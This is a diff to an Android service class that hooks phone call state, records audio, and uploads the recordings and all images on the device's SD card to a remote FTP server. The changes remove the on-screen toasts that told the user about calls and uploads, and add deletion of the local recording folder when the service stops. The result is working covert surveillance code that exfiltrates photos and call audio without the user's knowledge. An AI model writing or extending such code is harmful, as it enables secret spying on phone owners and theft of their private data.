@@ -3,30 +3,31 @@ package com.tangcco170205_ftp.service;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.os.Handler;
+import android.os.AsyncTask;
 import android.os.IBinder;
-import android.os.Looper;
-import android.os.Message;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.widget.Toast;
 
 import com.tangcco170205_ftp.Constants;
 import com.tangcco170205_ftp.ftputils.FTPManager;
 import com.tangcco170205_ftp.ftputils.ResultBean;
 import com.tangcco170205_ftp.utils.AudioRecoderUtils;
+import com.tangcco170205_ftp.utils.FileUtils;
 import com.tangcco170205_ftp.utils.NetWorkUtil;
 
 import java.io.File;
 import java.io.IOException;
+import java.util.List;
+import java.util.concurrent.Executor;
+import java.util.concurrent.Executors;
 
-public class MyService extends Service {
+public class MyService extends Service implements FileUtils.IGetDataImage {
     private static final int LOGIN_OK = 1;
     private AudioRecoderUtils recoderUtils;
-    private Handler mHandler;
     //ftp上传核心类
     private FTPManager ftpManager;
+    private Executor mPool;
 
 
     @Override
@@ -37,10 +38,22 @@ public class MyService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        //登录
+        new LoginTask().execute();
 
-        initHandler();
+        FileUtils iGetDataImage;
+        iGetDataImage = new FileUtils();
+        iGetDataImage.setDataImage(this);
+
+        //初始化线程池
+        mPool = Executors.newFixedThreadPool(4);
         recoderUtils = new AudioRecoderUtils();
         recoderUtils.setOnAudioStatusUpdateListener(new AudioRecoderUtils.OnAudioStatusUpdateListener() {
+            /**
+             * 更新录音分贝 此处用不到
+             * @param db 当前声音分贝
+             * @param time 录音时长
+             */
             @Override
             public void onUpdate(double db, long time) {
 
@@ -49,16 +62,12 @@ public class MyService extends Service {
             @Override
             public void onStop(final String filePath) {
                 //上传文件到服务器
-                boolean wiFiConnected = NetWorkUtil.isWiFiConnected(getApplicationContext());
-//                if (wiFiConnected) {
                 new Thread(new Runnable() {
                     @Override
                     public void run() {
-                        uplioad(filePath, "amr");
+                        upload(filePath, true);
                     }
-                }) {
-                }.start();
-                Toast.makeText(MyService.this, "上传录音文件成功", Toast.LENGTH_SHORT).show();
+                }).start();
             }
         });
 
@@ -71,7 +80,6 @@ public class MyService extends Service {
             @Override
             public void onCallStateChanged(int state, String incomingNumber) {
                 super.onCallStateChanged(state, incomingNumber);
-                Toast.makeText(MyService.this, "来电", Toast.LENGTH_SHORT).show();
 
                 switch (state) {
                     case TelephonyManager.CALL_STATE_RINGING:// 来电
@@ -97,35 +105,17 @@ public class MyService extends Service {
         }, PhoneStateListener.LISTEN_CALL_STATE);
     }
 
-    private void initHandler() {
-        Looper.prepare();
 
-        mHandler = new Handler() {
-            @Override
-            public void handleMessage(Message msg) {
-                super.handleMessage(msg);
-                boolean wiFiConnected = NetWorkUtil.isWiFiConnected(getApplicationContext());
-                if (wiFiConnected) {
-                    new PictureThread("/mnt/sdcard/DCIM").start();
-                    new AudioThread("/mnt/sdcard/record").start();
-                }
-            }
-        };
-
-
-        Looper.loop();
-    }
-
-    private void uplioad(String pathname, String ext) {
+    private void upload(String pathname,boolean isDelete) {
         ResultBean resultBean = null;
 
         try {
             // 上传;
-            resultBean = ftpManager.uploading(new File(pathname), FTPManager.REMOTE_PATH, ext);
+            File localFile = new File(pathname);
+            resultBean = ftpManager.uploading(localFile, FTPManager.REMOTE_PATH,isDelete);
             if (resultBean.isSucceed()) {
                 Log.e("TAG", "uploading ok...time:" + resultBean.getTime()
                         + " and size:" + resultBean.getResponse());
-
             } else {
                 Log.e("TAG", "uploading fail");
             }
@@ -133,6 +123,15 @@ public class MyService extends Service {
             e.printStackTrace();
         }
     }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        String sdPath = FileUtils.getSDPath(true) + "/record";
+        File file = new File(sdPath);
+        FileUtils.deleteDir(file);
+    }
+
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -148,7 +147,6 @@ public class MyService extends Service {
         try {
             ftpManager.openConnect();
 //            Toast.makeText(this, "登陆成功", Toast.LENGTH_SHORT).show();
-            mHandler.sendEmptyMessage(LOGIN_OK);
             return true;
         } catch (IOException e) {
             e.printStackTrace();
@@ -156,38 +154,82 @@ public class MyService extends Service {
         return false;
     }
 
-    class PictureThread extends Thread {
-        String path;
+    /**
+     * @param imagePaths
+     */
+    @Override
+    public void addDataImage(final List<File> imagePaths) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                for (File file : imagePaths) {
+                    try {
+                        ftpManager.uploading(file, FTPManager.REMOTE_PATH, false);
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
 
-        public PictureThread(String path) {
-            this.path = path;
+                }
+
+            }
+        }).start();
+
+    }
+
+//    class PictureThread extends Thread {
+//        String path;
+//
+//        public PictureThread(String path) {
+//            this.path = path;
+//        }
+//
+//        @Override
+//        public void run() {
+//            upload(path);
+//        }
+//    }
+
+//    class AudioThread extends Thread {
+//        String path;
+//
+//        public AudioThread(String path) {
+//            this.path = path;
+//        }
+//
+//        @Override
+//        public void run() {
+//            upload(path);
+//        }
+//    }
+
+    class LoginTask extends AsyncTask<Void, Void, Boolean> {
+        @Override
+        protected Boolean doInBackground(Void... params) {
+
+
+            return login();
         }
 
         @Override
-        public void run() {
-            uplioad(path, "jpg|png");
+        protected void onPostExecute(Boolean aVoid) {
+            super.onPostExecute(aVoid);
+
+            if (aVoid) {
+                boolean wiFiConnected = NetWorkUtil.isWiFiConnected(getApplicationContext());
+                if (wiFiConnected) {
+                    mPool.execute(new Runnable() {
+                        @Override
+                        public void run() {
+                            upload(FileUtils.getSDPath(true) + File.separator + "record", true);
+                            FileUtils.getImages(MyService.this);
+                        }
+                    });
+                }
+            } else {
+                Log.d("TAG", "onPostExecute: 登录失败");
+            }
         }
     }
 
-    class AudioThread extends Thread {
-        String path;
-
-        public AudioThread(String path) {
-            this.path = path;
-        }
-
-        @Override
-        public void run() {
-            uplioad(path, "amr");
-        }
-    }
-
-    class LoginThread extends Thread {
-        @Override
-        public void run() {
-            //登录
-            login();
-        }
-    }
 
 }
